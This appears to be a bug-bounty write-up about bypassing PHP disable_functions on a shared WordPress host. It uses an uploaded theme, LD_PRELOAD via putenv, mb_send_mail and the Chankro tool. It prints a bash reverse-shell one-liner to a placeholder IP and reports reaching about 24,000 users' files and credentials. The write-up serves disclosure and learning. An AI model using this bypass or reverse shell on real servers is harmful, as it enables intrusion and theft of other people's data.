---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-13_how-i-bypassed-disable_functions-in-php-to-get-a-remote-shell.md
original_filename: 2022-03-13_how-i-bypassed-disable_functions-in-php-to-get-a-remote-shell.md
title: How I bypassed disable_functions in php to get a remote shell
category: documents
detected_topics:
- command-injection
- otp
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- otp
- api-security
- supply-chain
language: en
raw_sha256: cf0add961d7ee4d6f06498c675a7806d512d2df1b8d6cb9636576b7fbc888601
text_sha256: d3b5054e81cae5ad43c489e0c7c5b733fbbc00935fefe342b71a7c307b513712
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# How I bypassed disable_functions in php to get a remote shell

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-13_how-i-bypassed-disable_functions-in-php-to-get-a-remote-shell.md
- Source Type: markdown
- Detected Topics: command-injection, otp, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `cf0add961d7ee4d6f06498c675a7806d512d2df1b8d6cb9636576b7fbc888601`
- Text SHA256: `d3b5054e81cae5ad43c489e0c7c5b733fbbc00935fefe342b71a7c307b513712`


## Content

---
title: "How I bypassed disable_functions in php to get a remote shell"
url: "https://melotover.medium.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979"
authors: ["Asem Eleraky (@melotover)"]
bugs: ["RCE"]
publication_date: "2022-03-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2827
scraped_via: "browseros"
---

# How I bypassed disable_functions in php to get a remote shell

Asem Eleraky
 highlighted

How I bypassed disable_functions in php to get a remote shell
Asem Eleraky
Follow
5 min read
·
Mar 13, 2022

165

3

Today I will show you how I was able to bypass disable_functions and get a remote shell that lead me to access most of the users' files.

First of all, This was a public program, but nevertheless, I will refer to it with target.com.

Application logic:

The objective of this target application is to create new blogs for the registered users under its domain (e.g. newblog.target.com) using a WordPress engine.

Blogs pages can be edited and designed either with the application editor or with the WordPress dashboard.

Exploration:

Starting from my newly created blog, I tinkered around to check what privileges I have and what features I’m allowed to use or modify, and in the following screenshots, I showed my first observation! Although I had the Administrator role, my blog didn’t have an editor tab, unlike what a typical WordPress blog would have.

Press enter or click to view image in full size

There is no way I can edit any plugins or themes, but I can upload a new one.

I need to check if there are any restrictions on uploading edited files, also need to check the ability to run my own PHP code.

So instead of editing a current theme/plugin, I started to upload a new one, I downloaded a simple theme called “Blank Canvas” and tried to open the main PHP file that will be run every time the application loads my blog so I can get the result of my code immediately, and this file was functions.php.

I tried printing a simple string and all was good.

Press enter or click to view image in full size

Then I started to run any system commands with shell_exec() and system() functions and more, but there was no output!

I guessed that these functions were disabled, and after checking phpinfo(), I was right!

Press enter or click to view image in full size

If you don’t know what disable_functions is, this allows the server to disable certain PHP functions to upscale the security of the server, and you can set it with php.ini file or with the server configuration.

Also when I checked open_basedir to check the open directories that I was allowed to access. -all paths are separated with a colon-.

I found that I can’t access any system files, just my uploaded and wp files.

Press enter or click to view image in full size

I also noticed from the allowed directories that my website subdomain has its own files under the following path

/mnt/customars-MY_SUBDOAMIN_NAME-wordpress-pvc-RANDOM_VALUE/

This also got my attention, because if my account/website has a directory in the server, maybe this server is a shared server and contains other users' files!

And if so, and as I said above, we can not access it because of the open_basedir policy, so we need to find a way to bypass these restrictions and get a remote shell to explore the server files to check if my guess is right or not.

Bypassing disable_functions:

After some research, I came up with two methods, let’s discuss one of them, but before we start, there are some points to declare:

There is an environment variable called LD_PRELOAD, it provides the possibility of pre-load a library - LibraryName.so - before the rest of the other libraries.
If we have the ability to set it to a path of a shared object that is under our control, that file will be loaded before any other library, Yes, without the PHP restrictions!
To do so, it is necessary to run a binary program first.

Now we have the main idea, which is setting or overwriting the LD_PRELOAD environment variable to a controlled shared library.

Get Asem Eleraky’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Briefly, we need the following:

A binary to be executed.
A way to set or overwrite the LD_PRELOAD variable.
Creating our arbitrary object that can be a binary or a bash script so we can run commands or get a reverse shell.

One of the famous functions in PHP is the mail() function, If it is executed in PHP, and I know it’s disabled in phpinfo page in our case. Still, anyway, this function will use the /user/sbin/sendmail binary file on your system, PHP will first look for sendmail in your $PATH and then execute it, and it is exactly what we want, But it is disabled as we know, so we need an alternative to it!

There is a function that works the same as “mail()” is “mb_send_mail()” but it will work only if the mbstring module is enabled, let’s retake a look at phpinfo.

Press enter or click to view image in full size

Nice, it’s enabled, now we can use it.

For setting the environment variable, we can use putenv() function, and as you may noticed, it is not disabled as well.

the last thing is to create our arbitrary library, I found the Chankro tool, which will help us to do all of that, you will give it your reverse shell payload and the directory you control and it will provide you with the final PHP code to include in the theme files.

This tool is based on using the mail() function, so we can easily edit the source code and change mail() to mb_send_mail().

Press enter or click to view image in full size

Save the edited file, and we can use a simple reverse shell payload like

bash -c 'sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'

Now we can run the tool and the result will be a PHP file that has our arbitrary code.

Let’s add its content to the functions.php in the “Blank Canvas” theme files and upload it.

All is good, we can create a Netcat listener and visit our website.

Press enter or click to view image in full size
Press enter or click to view image in full size

We got a reverse shell, now back to the main goal, we want to know if this is a shared server that has other users' files or not.

And when I searched, I found files for about 24000 users!

Press enter or click to view image in full size

Also, I found Databases usernames and passwords for most of the users, I found some of others’ Auth tokens, and more.

I hope you enjoyed reading and I will be pleased if you have any feedback!

References:
https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/ref.mail.html
https://www.tarlogic.com/blog/how-to-bypass-disable_functions-and-open_basedir/
